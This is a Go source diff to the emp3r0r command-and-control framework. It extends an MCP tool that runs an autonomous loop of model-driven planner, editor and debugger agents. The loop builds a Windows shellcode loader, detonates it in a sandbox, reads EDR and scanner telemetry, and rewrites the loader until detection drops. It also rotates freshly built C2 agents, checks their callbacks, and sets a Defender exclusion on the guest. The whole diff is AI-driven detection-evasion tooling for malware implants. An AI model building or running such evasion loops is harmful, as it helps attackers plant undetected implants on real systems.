@@ -7,10 +7,16 @@ import (
 	"os"
 	"path/filepath"
 	"strings"
+	"sync"
 	"time"
 
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/api/client"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/builder"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/detection"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/modules"
+	"github.com/jm33-m0/emp3r0r/core/internal/cc/operator"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/sanitize"
 )
 
@@ -136,20 +142,32 @@ func (a *Actions) detectionTools() map[string]Tool {
 				Type: "function",
 				Function: FunctionDef{
 					Name:        "detection_loop",
-					Description: "Run the autonomous Norma detection loop: build loader_windows from a source directory, detonate it in LitterBox, import every saved analyzer result (RedEdr, Moneta, pe-sieve, HollowsHunter, HSB, Patriot, Blender, YARA, CheckPlz, HolyGrail, and EDR profiles) into SQLite, edit module source, rebuild, and compare payloads. A planner chooses the hypothesis, an editor applies the edits and runs one cycle, and a debugger inspects the guest over SSH only when the console configured --guest-ssh (MCP does not enable it). When telemetry shows the loader, shellcode producer, wrapper, or injection path is detected, the planner may choose another mechanism. Full feedback, build logs, and per-payload telemetry stay in SQLite. Requires approve_execution=true. This edits module source and runs model-chosen builds with operator privileges; run it on a dedicated, disposable VM.",
+					Description: "Run the autonomous Norma detection loop: build loader_windows from a source directory, detonate it in LitterBox, import every saved analyzer result (RedEdr, Moneta, pe-sieve, HollowsHunter, HSB, Patriot, Blender, YARA, CheckPlz, HolyGrail, and EDR profiles) into SQLite, edit module source, rebuild, and compare payloads. A planner chooses the hypothesis, an editor applies the edits and runs one cycle, and a debugger inspects the guest over SSH when guest_ssh or the detection environment is configured. Pass agent_uuid for live C2 verification; otherwise the loop records execution=unverified and builds fresh agents for later cycles. When telemetry shows the loader, shellcode producer, wrapper, or injection path is detected, the planner may choose another mechanism. Full feedback, build logs, and per-payload telemetry stay in SQLite. Requires approve_execution=true. This edits module source and runs model-chosen builds with operator privileges; run it on a dedicated, disposable VM.",
 					Parameters: ObjectSchema(map[string]any{
-						"module_dir":        StringProp("loader_windows source directory."),
-						"shellcode":         StringProp("Go agent shellcode path. Generate it first with generate --type windows_executable."),
-						"iterations":        IntegerProp("Maximum cycles including baseline. Default 3."),
-						"stages":            map[string]any{"type": "array", "items": map[string]any{"type": "string", "enum": []string{"static", "dynamic"}}, "description": "Stages; dynamic is required."},
-						"process":           StringProp("Sacrificial process override; omit to let the source default control it."),
-						"format":            StringProp("Loader host format: exe, service, or dll."),
-						"inject":            StringProp("Injection override; omit to let the module default control it."),
-						"smw":               StringProp("on or off."),
-						"producers":         map[string]any{"type": "array", "items": map[string]any{"type": "string"}, "description": "Shellcode producer modules as name=dir; defaults to the installed donut and crystal_pack."},
-						"read_roots":        map[string]any{"type": "array", "items": map[string]any{"type": "string"}, "description": "Read-only source roots; defaults to the loader's shared build inputs."},
-						"turns":             IntegerProp("Maximum Norma turns per session. Default 60."),
-						"approve_execution": BooleanProp("Allow the loop to detonate the payload and edit module source."),
+						"module_dir":           StringProp("loader_windows source directory."),
+						"shellcode":            StringProp("Go agent shellcode path. Generate it first with generate --type windows_executable."),
+						"agent_uuid":           StringProp("UUID of the generated agent wrapped in the shellcode. Required for execution=verified checks and final verification."),
+						"agent_type":           StringProp("Agent payload type used for rotation: windows_executable (default) or windows_dll."),
+						"arch":                 StringProp("Agent architecture for rotation. Default amd64."),
+						"guest_ssh":            StringProp("Sandbox guest SSH endpoint user@host:port; enables the debugger (env EMP3R0R_DETECTION_GUEST_SSH)."),
+						"guest_ssh_key":        StringProp("Sandbox-only SSH private key (env EMP3R0R_DETECTION_GUEST_SSH_KEY)."),
+						"guest_ssh_exclude":    StringProp("Defender exclusion and debug staging path on the guest (default C:\\LitterBox\\emp-debug)."),
+						"planner_timeout":      IntegerProp("Planner decision window in seconds. Default 600."),
+						"editor_timeout":       IntegerProp("Editor decision window in seconds. Default 900."),
+						"cycle_timeout":        IntegerProp("Build/detonate/verify deadline in seconds. Default 3600."),
+						"planner_read_budget":  IntegerProp("Read-only calls before the planner must return a plan. Default 12; negative disables."),
+						"editor_read_budget":   IntegerProp("Read-only calls without an edit before the editor loses read tools. Default 12; negative disables."),
+						"debugger_tool_budget": IntegerProp("Total calls per debugger pass. 0 means no cap; turn and time limits still apply."),
+						"iterations":           IntegerProp("Maximum cycles including baseline. Default 3."),
+						"stages":               map[string]any{"type": "array", "items": map[string]any{"type": "string", "enum": []string{"static", "dynamic"}}, "description": "Stages; dynamic is required."},
+						"process":              StringProp("Sacrificial process override; omit to let the source default control it."),
+						"format":               StringProp("Loader host format: exe, service, or dll."),
+						"inject":               StringProp("Injection override; omit to let the module default control it."),
+						"smw":                  StringProp("on or off."),
+						"producers":            map[string]any{"type": "array", "items": map[string]any{"type": "string"}, "description": "Shellcode producer modules as name=dir; defaults to the installed donut and crystal_pack."},
+						"read_roots":           map[string]any{"type": "array", "items": map[string]any{"type": "string"}, "description": "Read-only source roots; defaults to the loader's shared build inputs."},
+						"turns":                IntegerProp("Maximum Norma turns per session. Default 60."),
+						"approve_execution":    BooleanProp("Allow the loop to detonate the payload and edit module source."),
 					}, "module_dir", "shellcode", "approve_execution"),
 				},
 			},
@@ -203,31 +221,43 @@ func (a *Actions) detectionTools() map[string]Tool {
 }
 
 type detectionArgs struct {
-	Module           string   `json:"module"`
-	Artifact         string   `json:"artifact"`
-	Stages           []string `json:"stages"`
-	EDRProfile       string   `json:"edr_profile"`
-	ApproveExecution bool     `json:"approve_execution"`
-	RunID            string   `json:"run_id"`
-	Analyze          bool     `json:"analyze"`
-	Limit            int      `json:"limit"`
-	Path             string   `json:"path"`
-	URL              string   `json:"url"`
-	Source           string   `json:"source"`
-	SQL              string   `json:"sql"`
-	LoopID           string   `json:"loop_id"`
-	ModuleDir        string   `json:"module_dir"`
-	Shellcode        string   `json:"shellcode"`
-	Iterations       int      `json:"iterations"`
-	Process          string   `json:"process"`
-	Format           string   `json:"format"`
-	Inject           string   `json:"inject"`
-	SMW              string   `json:"smw"`
-	Producers        []string `json:"producers"`
-	ReadRoots        []string `json:"read_roots"`
-	Turns            int      `json:"turns"`
-	From             string   `json:"from"`
-	To               string   `json:"to"`
+	Module             string   `json:"module"`
+	Artifact           string   `json:"artifact"`
+	Stages             []string `json:"stages"`
+	EDRProfile         string   `json:"edr_profile"`
+	ApproveExecution   bool     `json:"approve_execution"`
+	RunID              string   `json:"run_id"`
+	Analyze            bool     `json:"analyze"`
+	Limit              int      `json:"limit"`
+	Path               string   `json:"path"`
+	URL                string   `json:"url"`
+	Source             string   `json:"source"`
+	SQL                string   `json:"sql"`
+	LoopID             string   `json:"loop_id"`
+	ModuleDir          string   `json:"module_dir"`
+	Shellcode          string   `json:"shellcode"`
+	AgentUUID          string   `json:"agent_uuid"`
+	AgentType          string   `json:"agent_type"`
+	Arch               string   `json:"arch"`
+	GuestSSH           string   `json:"guest_ssh"`
+	GuestSSHKey        string   `json:"guest_ssh_key"`
+	GuestSSHExclude    string   `json:"guest_ssh_exclude"`
+	PlannerTimeout     int      `json:"planner_timeout"`
+	EditorTimeout      int      `json:"editor_timeout"`
+	CycleTimeout       int      `json:"cycle_timeout"`
+	PlannerReadBudget  int      `json:"planner_read_budget"`
+	EditorReadBudget   int      `json:"editor_read_budget"`
+	DebuggerToolBudget int      `json:"debugger_tool_budget"`
+	Iterations         int      `json:"iterations"`
+	Process            string   `json:"process"`
+	Format             string   `json:"format"`
+	Inject             string   `json:"inject"`
+	SMW                string   `json:"smw"`
+	Producers          []string `json:"producers"`
+	ReadRoots          []string `json:"read_roots"`
+	Turns              int      `json:"turns"`
+	From               string   `json:"from"`
+	To                 string   `json:"to"`
 }
 
 func (a *Actions) detectionPlan(ctx context.Context, raw json.RawMessage) (any, error) {
@@ -769,9 +799,13 @@ func (a *Actions) detectionLoop(ctx context.Context, raw json.RawMessage) (any, 
 	command := fmt.Sprintf("detection_loop %s %s", sanitize.SanitizeOneLine(module), sanitize.SanitizeOneLine(shellcode))
 	review := def.OpsecReview{
 		Noise:      "high",
-		Reversible: false,
+		Reversible: true,
 		Rules:      []string{"process-creation", "local-code-edit"},
-		Reasons:    []string{"detonates the payload in LitterBox and edits module source"},
+		Reasons: []string{
+			"detonates the payload in LitterBox and edits module source",
+			"source edits are tracked in the loop's shadow repository and non-executing cycles restore the last executing source",
+		},
+		Artifacts: []string{"sandbox detonation", "operator-host source change"},
 	}
 	decision, auditErr := a.screenWithFlags("detection_loop", module, command, nil, nil, review)
 	if !decision.Allowed {
@@ -790,12 +824,34 @@ func (a *Actions) detectionLoop(ctx context.Context, raw json.RawMessage) (any, 
 	if len(readRoots) == 0 {
 		readRoots = detection.DefaultReadRoots(moduleDir)
 	}
-	result, err := detection.RunEvolve(loopCtx, detection.EvolveConfig{
+	guest, err := mcpGuestConfig(args)
+	if err != nil {
+		return nil, err
+	}
+	var verify detection.VerifyOps
+	if strings.TrimSpace(args.AgentUUID) != "" {
+		verify = mcpVerifyOps{}
+	}
+	agentType := strings.TrimSpace(args.AgentType)
+	if agentType == "" {
+		agentType = "windows_executable"
+	}
+	arch := strings.TrimSpace(args.Arch)
+	if arch == "" {
+		arch = "amd64"
+	}
+	cfg := detection.EvolveConfig{
 		Module: module, ModuleDir: moduleDir, Shellcode: shellcode,
 		SandboxURL: a.Detection.Client.URL(), StoreRoot: a.Detection.Store.Root,
 		Process: args.Process, Format: args.Format, Inject: args.Inject, SMW: args.SMW,
 		ProducerDirs: producers, ReadRoots: readRoots,
 		Stages: args.Stages, Iterations: args.Iterations, Turns: args.Turns, Git: true,
+		ExpectedAgentUUID: strings.TrimSpace(args.AgentUUID),
+		AgentType:         agentType, AgentArch: arch, AgentCC: strings.TrimSpace(a.DefaultCC),
+		Guest: guest, Verify: verify,
+		BuildAgent: func(opts detection.AgentBuildOptions) (*detection.AgentBuildResult, error) {
+			return a.buildDetectionAgent(opts)
+		},
 		Logf: nil,
 		Audit: func(action, target, detail string) {
 			if a.Audit == nil {
@@ -810,7 +866,41 @@ func (a *Actions) detectionLoop(ctx context.Context, raw json.RawMessage) (any, 
 				Phase:    "evolve",
 			})
 		},
-	})
+	}
+	logPath := filepath.Join(a.Detection.Store.Root, "detect-loop-"+time.Now().UTC().Format("20060102-150405")+".log")
+	if logFile, logErr := os.OpenFile(logPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0o600); logErr == nil {
+		defer logFile.Close()
+		var logMu sync.Mutex
+		cfg.Logf = func(class logging.Class, format string, args ...any) {
+			logMu.Lock()
+			defer logMu.Unlock()
+			fmt.Fprintf(logFile, "%s %v %s\n", time.Now().Format("15:04:05"), class, fmt.Sprintf(format, args...))
+		}
+	}
+	if args.PlannerTimeout > 0 {
+		cfg.PlannerTimeout = time.Duration(args.PlannerTimeout) * time.Second
+	}
+	if args.EditorTimeout > 0 {
+		cfg.EditorTimeout = time.Duration(args.EditorTimeout) * time.Second
+	}
+	if args.CycleTimeout > 0 {
+		cfg.CycleTimeout = time.Duration(args.CycleTimeout) * time.Second
+	}
+	if args.PlannerReadBudget != 0 {
+		cfg.PlannerReadBudget = args.PlannerReadBudget
+	}
+	if args.EditorReadBudget != 0 {
+		cfg.EditorReadBudget = args.EditorReadBudget
+	}
+	if args.DebuggerToolBudget != 0 {
+		cfg.DebuggerToolBudget = args.DebuggerToolBudget
+	}
+	if verify != nil {
+		cfg.FinalVerify = func(ctx context.Context, uuid string) (string, error) {
+			return mcpFinalVerify(ctx, uuid, detection.DefaultVerifyModule)
+		}
+	}
+	result, err := detection.RunEvolve(loopCtx, cfg)
 	if err != nil {
 		return a.actionResultWithFlags("detection_loop", command, module, nil, nil, review, decision, auditErr, "", err, true), nil
 	}
@@ -818,8 +908,171 @@ func (a *Actions) detectionLoop(ctx context.Context, raw json.RawMessage) (any, 
 	_ = json.Unmarshal(result.Answer, &answer)
 	return map[string]any{
 		"loop_id": result.LoopID, "answer": answer, "report": result.Report,
-		"cycles": result.Cycles, "last": result.Last, "executed": true,
+		"cycles": result.Cycles, "last": result.Last, "executed": true, "log_path": logPath,
 		"note": "full feedback and per-payload telemetry are in SQLite; use detection_payloads, detection_compare, or detection_query",
+	}, nil
+}
+
+// mcpVerifyOps performs the loop's scoped C2 checks over the same operator
+// client the console uses. It never lists another agent as the loop's target.
+type mcpVerifyOps struct{}
+
+func (mcpVerifyOps) AgentStatus(_ context.Context, uuid string) (*detection.VerifyAgentStatus, error) {
+	agent, err := mcpAgentByUUID(uuid)
+	if err != nil {
+		return nil, err
+	}
+	return &detection.VerifyAgentStatus{
+		ExpectedAgent: uuid,
+		Online:        agent != nil,
+		Agent:         detection.AgentSummary(agent),
+	}, nil
+}
+
+func (mcpVerifyOps) RunVerifyModule(ctx context.Context, uuid, module string) (*detection.VerifyModuleResult, error) {
+	agent, err := mcpAgentByUUID(uuid)
+	if err != nil {
+		return nil, err
+	}
+	if agent == nil {
+		return nil, fmt.Errorf("agent %s is not online; payload is not running", uuid)
+	}
+	output, jobID, runErr := mcpRunVerifyModule(ctx, agent, module)
+	result := &detection.VerifyModuleResult{
+		Agent: detection.AgentSummary(agent), Module: module, JobID: jobID, Output: output,
+	}
+	if runErr != nil {
+		result.Message = runErr.Error()
+		return result, runErr
+	}
+	return result, nil
+}
+
+func (mcpVerifyOps) ForgetAgent(_ context.Context, uuid string) error {
+	_, err := operator.ForgetAgent(uuid)
+	return err
+}
+
+func mcpAgentByUUID(uuid string) (*def.Emp3r0rAgent, error) {
+	agents, err := client.GetAgentList()
+	if err != nil {
+		return nil, err
+	}
+	return detection.FindAgentByUUID(agents, uuid), nil
+}
+
+func mcpRunVerifyModule(ctx context.Context, agent *def.Emp3r0rAgent, module string) (string, string, error) {
+	if agent == nil {
+		return "", "", fmt.Errorf("no agent")
+	}
+	jobID, err := modules.DispatchModule(agent, module, nil)
+	if err != nil {
+		return "", "", err
+	}
+	deadline := time.Now().Add(detection.PayloadVerifyTimeout)
+	for {
+		resp, err := client.GetJobOutput(jobID, 0, 16<<10, true)
+		if err == nil && resp != nil && strings.TrimSpace(resp.Output) != "" {
+			return resp.Output, jobID, nil
+		}
+		if time.Now().After(deadline) {
+			if err != nil {
+				return "", jobID, fmt.Errorf("wait for %s output: %w", module, err)
+			}
+			return "", jobID, fmt.Errorf("%s produced no output before the deadline", module)
+		}
+		select {
+		case <-ctx.Done():
+			return "", jobID, ctx.Err()
+		case <-time.After(time.Second):
+		}
+	}
+}
+
+func mcpFinalVerify(ctx context.Context, uuid, module string) (string, error) {
+	deadline := time.Now().Add(detection.PayloadVerifyTimeout)
+	for {
+		agent, err := mcpAgentByUUID(uuid)
+		if err != nil {
+			return "", err
+		}
+		if agent != nil {
+			output, _, runErr := mcpRunVerifyModule(ctx, agent, module)
+			return output, runErr
+		}
+		if time.Now().After(deadline) {
+			return "", fmt.Errorf("agent %s did not come online within %s", uuid, detection.PayloadVerifyTimeout)
+		}
+		select {
+		case <-ctx.Done():
+			return "", ctx.Err()
+		case <-time.After(time.Second):
+		}
+	}
+}
+
+// buildDetectionAgent is the loop's rotation builder. It produces a fresh Go
+// agent and leaves the wrapper to the loop's configured producer.
+func (a *Actions) buildDetectionAgent(opts detection.AgentBuildOptions) (*detection.AgentBuildResult, error) {
+	a.generateMu.Lock()
+	defer a.generateMu.Unlock()
+	agentCfg := builder.AgentConfig{}
+	if cc := strings.TrimSpace(a.DefaultCC); cc != "" {
+		agentCfg.CCAddress = &cc
+	}
+	res, err := builder.GenerateAgentArtifact(agentCfg, opts.Type, opts.Arch, client.SignAgent)
+	if err != nil {
+		logging.Warningf("detection_loop: signed agent generation failed (%v); building without a C2 signature", err)
+		res, err = builder.GenerateAgentArtifact(agentCfg, opts.Type, opts.Arch, nil)
+	}
+	if err != nil {
+		return nil, err
+	}
+	if res == nil || strings.TrimSpace(res.OutputFile) == "" {
+		return nil, fmt.Errorf("agent build produced no artifact")
+	}
+	artifact, err := detection.InspectArtifact(res.OutputFile)
+	if err != nil {
+		return nil, err
+	}
+	return &detection.AgentBuildResult{
+		ArtifactPath: res.OutputFile, Type: opts.Type, Arch: opts.Arch,
+		AgentUUID: res.AgentUUID, SHA256: artifact.SHA256, Size: artifact.Size,
+	}, nil
+}
+
+// mcpGuestConfig resolves the debugger endpoint from the tool call or the
+// detection environment. The guest is the sandbox VM; this is not a target.
+func mcpGuestConfig(args detectionArgs) (*detection.GuestSSHConfig, error) {
+	endpoint := strings.TrimSpace(args.GuestSSH)
+	if endpoint == "" {
+		endpoint = strings.TrimSpace(os.Getenv("EMP3R0R_DETECTION_GUEST_SSH"))
+	}
+	key := strings.TrimSpace(args.GuestSSHKey)
+	if key == "" {
+		key = strings.TrimSpace(os.Getenv("EMP3R0R_DETECTION_GUEST_SSH_KEY"))
+	}
+	if endpoint == "" && key == "" {
+		return nil, nil
+	}
+	if endpoint == "" || key == "" {
+		return nil, fmt.Errorf("guest SSH requires both guest_ssh user@host:port and guest_ssh_key")
+	}
+	user, host, port, err := detection.ParseGuestSSHEndpoint(endpoint)
+	if err != nil {
+		return nil, err
+	}
+	key = detection.ExpandHomePath(key)
+	if info, err := os.Stat(key); err != nil || !info.Mode().IsRegular() {
+		return nil, fmt.Errorf("guest SSH key %q is not readable", key)
+	}
+	exclude := strings.TrimSpace(args.GuestSSHExclude)
+	if exclude == "" {
+		exclude = strings.TrimSpace(os.Getenv("EMP3R0R_DETECTION_GUEST_SSH_EXCLUDE"))
+	}
+	return &detection.GuestSSHConfig{
+		Host: host, Port: port, User: user, KeyPath: key,
+		ExcludePath: exclude, Timeout: 60 * time.Second,
 	}, nil
 }
 
